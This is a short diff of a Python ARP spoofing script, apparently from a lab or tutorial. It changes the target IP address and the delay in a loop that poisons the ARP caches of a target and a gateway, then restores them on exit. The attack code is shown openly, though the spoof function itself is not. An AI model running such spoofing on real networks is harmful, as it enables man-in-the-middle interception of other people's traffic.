@@ -26,12 +26,12 @@ def restore(dest_ip, src_ip):
 
 try:
     while True:
-        spoof("10.10.10.11", "10.10.10.2")
-        spoof("10.10.10.2", "10.10.10.11")
+        spoof("10.10.10.12", "10.10.10.2")
+        spoof("10.10.10.2", "10.10.10.12")
         sent_packets_count = sent_packets_count + 2
         print("\r[+] Packets sent: " + str(sent_packets_count), end="")
-        time.sleep(0)
+        time.sleep(2)
 except KeyboardInterrupt:
     print("\nRestoring ARP tables and exiting...")
-    restore("10.10.10.11", "10.10.10.2")
-    restore("10.10.10.2", "10.10.10.11")
+    restore("10.10.10.12", "10.10.10.2")
+    restore("10.10.10.2", "10.10.10.12")
